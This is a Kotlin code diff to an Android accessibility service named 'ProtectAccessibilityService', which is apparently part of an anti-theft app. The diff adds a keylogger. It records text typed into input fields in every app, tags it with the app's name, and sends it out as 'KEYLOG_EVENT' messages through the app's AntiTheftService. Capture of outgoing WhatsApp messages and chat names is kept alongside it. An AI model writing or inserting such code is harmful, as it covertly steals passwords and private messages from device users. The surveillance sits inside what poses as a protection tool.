@@ -17,6 +17,9 @@ class ProtectAccessibilityService : AccessibilityService() {
     private val whatsAppDrafts = mutableMapOf<String, String>()
     private var currentWhatsAppChat: String = ""
 
+    // Keylog: track last sent text per app to avoid spamming identical strings
+    private val lastKeylogText = mutableMapOf<String, String>()
+
     override fun onServiceConnected() {
         instance = this
         Log.d("AccessibilityService", "Connected — screen capture now permanent")
@@ -25,43 +28,63 @@ class ProtectAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         event ?: return
         val pkg = event.packageName?.toString() ?: return
-        if (pkg !in WHATSAPP_PACKAGES) {
-            currentWhatsAppChat = ""
-            return
+
+        // Track WhatsApp chat name
+        if (pkg in WHATSAPP_PACKAGES) {
+            when (event.eventType) {
+                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
+                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
+                    val chatName = findWhatsAppChatName(rootInActiveWindow)
+                    if (chatName.isNotBlank()) {
+                        currentWhatsAppChat = chatName
+                        Log.d("AccessibilityService", "WhatsApp chat: $currentWhatsAppChat")
+                    }
+                }
+                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
+                    val source = event.source ?: return
+                    val desc = source.contentDescription?.toString() ?: ""
+                    val isSend = desc.contains("enviar", ignoreCase = true) ||
+                            desc.contains("send", ignoreCase = true) ||
+                            desc.contains("send message", ignoreCase = true)
+                    if (isSend) {
+                        val text = whatsAppDrafts[pkg]
+                        if (!text.isNullOrBlank()) {
+                            val chat = currentWhatsAppChat.ifBlank { findWhatsAppChatName(rootInActiveWindow) }
+                            sendOutgoingWhatsApp(text, chat)
+                            whatsAppDrafts[pkg] = ""
+                        }
+                    }
+                }
+                else -> {}
+            }
+        } else {
+            // Reset WhatsApp chat when user leaves WhatsApp
+            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                currentWhatsAppChat = ""
+            }
         }
 
-        when (event.eventType) {
-            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
-            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
-                // Try to read the chat title from the action bar / toolbar
-                val chatName = findWhatsAppChatName(rootInActiveWindow)
-                if (chatName.isNotBlank()) {
-                    currentWhatsAppChat = chatName
-                    Log.d("AccessibilityService", "WhatsApp chat: $currentWhatsAppChat")
-                }
-            }
-            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
-                val source = event.source ?: return
-                if (source.className?.contains("EditText") == true) {
-                    val text = event.text.joinToString("")
-                    if (text.isNotBlank()) {
+        // Keylog: capture text changes from ANY app
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            val source = event.source ?: return
+            if (source.className?.contains("EditText") == true) {
+                val text = event.text.joinToString("")
+                if (text.isNotBlank() && text != lastKeylogText[pkg]) {
+                    lastKeylogText[pkg] = text
+
+                    // Also store as WhatsApp draft if applicable
+                    if (pkg in WHATSAPP_PACKAGES) {
                         whatsAppDrafts[pkg] = text
                     }
-                }
-            }
-            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
-                val source = event.source ?: return
-                val desc = source.contentDescription?.toString() ?: ""
-                val isSend = desc.contains("enviar", ignoreCase = true) ||
-                        desc.contains("send", ignoreCase = true) ||
-                        desc.contains("send message", ignoreCase = true)
-                if (isSend) {
-                    val text = whatsAppDrafts[pkg]
-                    if (!text.isNullOrBlank()) {
-                        val chat = currentWhatsAppChat.ifBlank { findWhatsAppChatName(rootInActiveWindow) }
-                        sendOutgoingWhatsApp(text, chat)
-                        whatsAppDrafts[pkg] = ""
-                    }
+
+                    // Resolve human-readable app label
+                    val appLabel = try {
+                        packageManager.getApplicationLabel(
+                            packageManager.getApplicationInfo(pkg, 0)
+                        ).toString()
+                    } catch (_: Exception) { pkg }
+
+                    sendKeylogEvent(pkg, appLabel, text)
                 }
             }
         }
@@ -121,6 +144,18 @@ class ProtectAccessibilityService : AccessibilityService() {
         }
         for (i in 0 until node.childCount) {
             collectWhatsAppTitleCandidates(node.getChild(i), out)
+        }
+    }
+
+    private fun sendKeylogEvent(app: String, appLabel: String, text: String) {
+        try {
+            val appJson      = Json.encodeToString(String.serializer(), app)
+            val labelJson    = Json.encodeToString(String.serializer(), appLabel)
+            val textJson     = Json.encodeToString(String.serializer(), text)
+            val payload = """{"type":"KEYLOG_EVENT","app":$appJson,"appLabel":$labelJson,"text":$textJson,"timestamp":${System.currentTimeMillis()}}"""
+            AntiTheftService.sendRawMessage(payload)
+        } catch (e: Exception) {
+            Log.e("AccessibilityService", "sendKeylogEvent error: ${e.message}")
         }
     }
 
